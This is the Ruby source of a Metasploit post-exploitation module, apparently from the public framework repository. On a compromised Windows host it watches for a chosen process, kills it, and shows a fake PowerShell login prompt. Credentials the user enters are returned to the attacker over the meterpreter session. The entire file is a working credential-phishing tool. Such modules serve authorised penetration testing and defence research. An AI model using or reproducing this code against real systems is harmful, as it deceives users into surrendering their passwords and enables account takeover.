##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Registry
  include Msf::Post::Windows::Powershell

  def initialize(info={})
    super(update_info(info,
      'Name'          => 'Windows Gather User Credentials (phishing)',
      'Description'   => %q{
                This module is able to perform a phishing attack on the target by popping up a loginprompt.
                When the user fills credentials in the loginprompt, the credentials will be sent to the attacker.
                The module is able to monitor for new processes and popup a loginprompt when a specific process is starting. Tested on Windows 7.
      },
      'License'       => MSF_LICENSE,
      'Author'        =>
            [
              'Wesley Neelen <security[at]forsec.nl>', # Metasploit module, @wez3forsec on Twitter
              'Matt Nelson'                           # Original powershell script, @enigma0x3 on Twitter
            ],
      'References'    => [ 'URL', 'https://forsec.nl/2015/02/windows-credentials-phishing-using-metasploit' ],
      'Platform'      => [ 'win' ],
      'Arch'          => [ ARCH_X86, ARCH_X64 ],
      'SessionTypes'  => [ 'meterpreter' ]
    ))

    register_options(
    [
      OptString.new('PROCESS', [ false, 'Prompt if a specific process is started by the target. (e.g. calc.exe or specify * for all processes)' ]),
      OptString.new('DESCRIPTION', [ true, 'Message shown in the loginprompt', "{PROCESS_NAME} needs your permissions to start. Please enter user credentials"]),
    ])

    register_advanced_options(
    [
      OptInt.new('TIMEOUT', [true, 'The maximum time (in seconds) to wait for any Powershell scripts to complete', 120])
    ])
  end

  # Function to run the InvokePrompt powershell script
  def execute_invokeprompt_script(description,process,path)
    base_script = File.read(File.join(Msf::Config.data_directory, "post", "powershell", "Invoke-LoginPrompt.ps1"))
    if process.nil?
       sdescription = description.gsub("{PROCESS_NAME} needs your permissions to start. ", "")
       psh_script = base_script.gsub("R{DESCRIPTION}", "#{sdescription}") << "Invoke-LoginPrompt"
    else
       sdescription = description.gsub("{PROCESS_NAME}", process)
       psh_script2 = base_script.gsub("R{DESCRIPTION}", "#{sdescription}") << "Invoke-LoginPrompt"
       psh_script = psh_script2.gsub("R{START_PROCESS}", "start-process \"#{path}\"")
    end
    compressed_script = compress_script(psh_script)
    cmd_out, runnings_pids, open_channels = execute_script(compressed_script, datastore['TIMEOUT'])
    while(d = cmd_out.channel.read)
      print_good("#{d}")
    end
  end

  # Function to monitor process creation
  def procmon(process, description)
     procs = []
     existingProcs = []
     detected = false
     first = true
     print_status("Monitoring new processes.")
     while detected == false
         sleep 1
         procs = client.sys.process.processes
         procs.each do |p|
            if p['name'] == process or process == "*"
               if first == true
                   print_status("#{p['name']} is already running. Waiting on new instances to start")
                   existingProcs.push(p['pid'])
               else
                  if !existingProcs.include? p['pid']
                      print_status("New process detected: #{p['pid']} #{p['name']}")
                      killproc(p['name'],p['pid'], description,p['path'])
                      detected = true
                  end
               end
            end
         end
     first = false
     end
  end

  # Function to kill the process
  def killproc(process,pid,description,path)
     print_status("Killing the process and starting the popup script. Waiting on the user to fill in his credentials...")
     client.sys.process.kill(pid)
     execute_invokeprompt_script(description,process,path)
  end

  # Main method
  def run
    process = datastore['PROCESS']
    description = datastore['DESCRIPTION']

    # Powershell installed check
    if have_powershell?
      print_good("PowerShell is installed.")
    else
      fail_with(Failure::Unknown, "PowerShell is not installed")
    end

    # Check whether target system is locked
    locked = client.railgun.user32.GetForegroundWindow()['return']
    if locked == 0
      fail_with(Failure::Unknown, "Target system is locked. This post module cannot start the loginprompt when the target system is locked.")
    end

    # Switch to check whether a specific process needs to be monitored, or just show the popup immediatly.
    case process
    when nil
      print_status("Starting the popup script. Waiting on the user to fill in his credentials...")
      execute_invokeprompt_script(description, nil, nil)
    else
      procmon(process, description)
    end
  end
end
